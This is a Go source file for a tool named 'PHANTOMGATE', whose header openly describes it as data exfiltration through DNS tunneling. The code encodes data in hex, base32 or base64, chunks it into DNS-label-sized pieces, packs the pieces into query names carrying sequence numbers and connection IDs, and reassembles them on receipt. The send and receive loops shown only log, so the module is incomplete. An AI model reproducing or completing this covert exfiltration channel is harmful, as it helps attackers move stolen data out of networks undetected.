package dns

import (
	"encoding/base32"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE DNS TUNNELING v3.0 — DATA EXFILTRATION VIA DNS
// ══════════════════════════════════════════════════════════════════════════════

type DNSTunnel struct {
	iface       string
	domain      string
	running     bool
	stopChan    chan struct{}
	
	// Tunnel state
	connections map[string]*TunnelConnection
	connMu      sync.RWMutex
	
	// Data buffers
	inbound     chan []byte
	outbound    chan []byte
	
	// Statistics
	stats       *TunnelStats
	
	// Configuration
	config      *TunnelConfig
}

type TunnelConnection struct {
	ID          string
	ClientIP    net.IP
	Domain      string
	Sequence    uint32
	LastActivity time.Time
	Data        []byte
	Complete    bool
}

type TunnelStats struct {
	BytesEncoded   int64
	BytesDecoded   int64
	QueriesHandled int64
	ResponsesSent  int64
	ConnectionsCreated int64
	StartTime      time.Time
}

type TunnelConfig struct {
	Interface    string
	Domain       string
	MaxChunkSize int
	Encoding     string // "hex", "base32", "base64"
	BufferSize   int
}

func NewDNSTunnel(cfg TunnelConfig) (*DNSTunnel, error) {
	if cfg.Domain == "" {
		cfg.Domain = "tunnel.local"
	}
	if cfg.MaxChunkSize == 0 {
		cfg.MaxChunkSize = 63 // Max DNS label length
	}
	if cfg.Encoding == "" {
		cfg.Encoding = "hex"
	}
	if cfg.BufferSize == 0 {
		cfg.BufferSize = 1024
	}
	
	return &DNSTunnel{
		iface:       cfg.Interface,
		domain:      cfg.Domain,
		stopChan:    make(chan struct{}),
		connections: make(map[string]*TunnelConnection),
		inbound:     make(chan []byte, cfg.BufferSize),
		outbound:    make(chan []byte, cfg.BufferSize),
		config:      &cfg,
		stats: &TunnelStats{
			StartTime: time.Now(),
		},
	}, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) Start() error {
	t.running = true
	
	log.Printf("[TUNNEL] Starting DNS tunnel on domain: %s", t.domain)
	log.Printf("[TUNNEL] Encoding: %s | Max chunk: %d bytes", t.config.Encoding, t.config.MaxChunkSize)
	
	// Start processing goroutines
	go t.processInbound()
	go t.processOutbound()
	
	return nil
}

func (t *DNSTunnel) Stop() {
	t.running = false
	close(t.stopChan)
	
	t.printStats()
	log.Printf("[TUNNEL] DNS tunnel stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// DATA ENCODING/DECODING
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) EncodeData(data []byte) []byte {
	switch t.config.Encoding {
	case "base32":
		return t.encodeBase32(data)
	case "base64":
		return t.encodeBase64(data)
	default: // hex
		return t.encodeHex(data)
	}
}

func (t *DNSTunnel) DecodeData(data []byte) ([]byte, error) {
	switch t.config.Encoding {
	case "base32":
		return t.decodeBase32(data)
	case "base64":
		return t.decodeBase64(data)
	default: // hex
		return t.decodeHex(data)
	}
}

func (t *DNSTunnel) encodeHex(data []byte) []byte {
	encoded := make([]byte, len(data)*2)
	for i, b := range data {
		encoded[i*2] = "0123456789abcdef"[b>>4]
		encoded[i*2+1] = "0123456789abcdef"[b&0x0f]
	}
	return encoded
}

func (t *DNSTunnel) decodeHex(data []byte) ([]byte, error) {
	if len(data)%2 != 0 {
		return nil, fmt.Errorf("invalid hex data length")
	}
	
	decoded := make([]byte, len(data)/2)
	for i := 0; i < len(data); i += 2 {
		high, err := hexDigit(data[i])
		if err != nil {
			return nil, err
		}
		low, err := hexDigit(data[i+1])
		if err != nil {
			return nil, err
		}
		decoded[i/2] = (high << 4) | low
	}
	return decoded, nil
}

func hexDigit(c byte) (byte, error) {
	switch {
	case c >= '0' && c <= '9':
		return c - '0', nil
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10, nil
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10, nil
	default:
		return 0, fmt.Errorf("invalid hex digit: %c", c)
	}
}

func (t *DNSTunnel) encodeBase32(data []byte) []byte {
	encoded := base32.StdEncoding.EncodeToString(data)
	return []byte(strings.ToLower(encoded))
}

func (t *DNSTunnel) decodeBase32(data []byte) ([]byte, error) {
	return base32.StdEncoding.DecodeString(strings.ToUpper(string(data)))
}

func (t *DNSTunnel) encodeBase64(data []byte) []byte {
	// URL-safe base64 without padding
	encoded := make([]byte, 0, (len(data)+2)/3*4)
	for i := 0; i < len(data); i += 3 {
		var b0, b1, b2 byte
		b0 = data[i]
		if i+1 < len(data) {
			b1 = data[i+1]
		}
		if i+2 < len(data) {
			b2 = data[i+2]
		}
		
		encoded = append(encoded, base64Encode(b0>>2))
		encoded = append(encoded, base64Encode(((b0&0x03)<<4)|(b1>>4)))
		if i+1 < len(data) {
			encoded = append(encoded, base64Encode(((b1&0x0f)<<2)|(b2>>6)))
		}
		if i+2 < len(data) {
			encoded = append(encoded, base64Encode(b2&0x3f))
		}
	}
	return encoded
}

func (t *DNSTunnel) decodeBase64(data []byte) ([]byte, error) {
	// Simple base64 decode
	encoded := string(data)
	for len(encoded)%4 != 0 {
		encoded += "="
	}
	
	decoded := make([]byte, 0, len(encoded)*3/4)
	for i := 0; i < len(encoded); i += 4 {
		if i+3 >= len(encoded) {
			break
		}
		
		b0 := base64Decode(encoded[i])
		b1 := base64Decode(encoded[i+1])
		b2 := base64Decode(encoded[i+2])
		b3 := base64Decode(encoded[i+3])
		
		decoded = append(decoded, (b0<<2)|(b1>>4))
		if encoded[i+2] != '=' {
			decoded = append(decoded, (b1<<4)|(b2>>2))
		}
		if encoded[i+3] != '=' {
			decoded = append(decoded, (b2<<6)|b3)
		}
	}
	return decoded, nil
}

func base64Encode(b byte) byte {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	return chars[b&0x3f]
}

func base64Decode(c byte) byte {
	switch {
	case c >= 'A' && c <= 'Z':
		return c - 'A'
	case c >= 'a' && c <= 'z':
		return c - 'a' + 26
	case c >= '0' && c <= '9':
		return c - '0' + 52
	case c == '-':
		return 62
	case c == '_':
		return 63
	default:
		return 0
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// DATA CHUNKING
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) ChunkData(data []byte) [][]byte {
	maxEncoded := t.config.MaxChunkSize
	// For hex encoding, encoded length is 2x data length
	// For base32, encoded length is ~1.6x data length
	// For base64, encoded length is ~1.33x data length
	
	var maxDataLen int
	switch t.config.Encoding {
	case "hex":
		maxDataLen = maxEncoded / 2
	case "base32":
		maxDataLen = maxEncoded * 5 / 8
	case "base64":
		maxDataLen = maxEncoded * 3 / 4
	default:
		maxDataLen = maxEncoded / 2
	}
	
	if maxDataLen <= 0 {
		maxDataLen = 30
	}
	
	var chunks [][]byte
	for i := 0; i < len(data); i += maxDataLen {
		end := i + maxDataLen
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}
	
	return chunks
}

func (t *DNSTunnel) ReassembleData(chunks [][]byte) []byte {
	totalLen := 0
	for _, chunk := range chunks {
		totalLen += len(chunk)
	}
	
	result := make([]byte, 0, totalLen)
	for _, chunk := range chunks {
		result = append(result, chunk...)
	}
	return result
}

// ══════════════════════════════════════════════════════════════════════════════
// DNS QUERY HANDLING
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) HandleQuery(queryName string) string {
	// Query format: <encoded-data>.<sequence>.<conn-id>.tunnel.domain
	parts := strings.Split(queryName, ".")
	if len(parts) < 4 {
		return ""
	}
	
	encodedData := parts[0]
	connID := parts[2]
	
	// Decode data
	data, err := t.DecodeData([]byte(encodedData))
	if err != nil {
		log.Printf("[TUNNEL] Decode error: %v", err)
		return ""
	}
	
	// Get or create connection
	t.connMu.Lock()
	conn, exists := t.connections[connID]
	if !exists {
		conn = &TunnelConnection{
			ID:     connID,
			Domain: t.domain,
		}
		t.connections[connID] = conn
		atomic.AddInt64(&t.stats.ConnectionsCreated, 1)
	}
	conn.LastActivity = time.Now()
	conn.Data = append(conn.Data, data...)
	t.connMu.Unlock()
	
	atomic.AddInt64(&t.stats.QueriesHandled, 1)
	atomic.AddInt64(&t.stats.BytesDecoded, int64(len(data)))
	
	// Send to inbound channel
	t.inbound <- data
	
	// Return response (could be command or acknowledgment)
	return "OK"
}

func (t *DNSTunnel) SendData(data []byte) error {
	// Chunk data
	chunks := t.ChunkData(data)
	
	// Create connection ID
	connID := fmt.Sprintf("c%d", time.Now().UnixNano()%100000)
	
	for i, chunk := range chunks {
		// Encode chunk
		encoded := t.EncodeData(chunk)
		
		// Create query name
		queryName := fmt.Sprintf("%s.%d.%s.%s", encoded, i, connID, t.domain)
		
		// Send to outbound channel
		t.outbound <- []byte(queryName)
		
		atomic.AddInt64(&t.stats.BytesEncoded, int64(len(chunk)))
	}
	
	return nil
}

// ══════════════════════════════════════════════════════════════════════════════
// PROCESSING
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) processInbound() {
	for {
		select {
		case <-t.stopChan:
			return
		case data := <-t.inbound:
			// Process inbound data
			log.Printf("[TUNNEL] Received %d bytes", len(data))
		}
	}
}

func (t *DNSTunnel) processOutbound() {
	for {
		select {
		case <-t.stopChan:
			return
		case data := <-t.outbound:
			// Process outbound data
			log.Printf("[TUNNEL] Sending %d bytes", len(data))
		}
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func (t *DNSTunnel) GetConnections() []*TunnelConnection {
	t.connMu.RLock()
	defer t.connMu.RUnlock()
	
	conns := make([]*TunnelConnection, 0, len(t.connections))
	for _, c := range t.connections {
		conns = append(conns, c)
	}
	return conns
}

func (t *DNSTunnel) printStats() {
	log.Printf("[TUNNEL STATS] Encoded: %d bytes | Decoded: %d bytes | Queries: %d | Connections: %d",
		atomic.LoadInt64(&t.stats.BytesEncoded),
		atomic.LoadInt64(&t.stats.BytesDecoded),
		atomic.LoadInt64(&t.stats.QueriesHandled),
		atomic.LoadInt64(&t.stats.ConnectionsCreated))
}
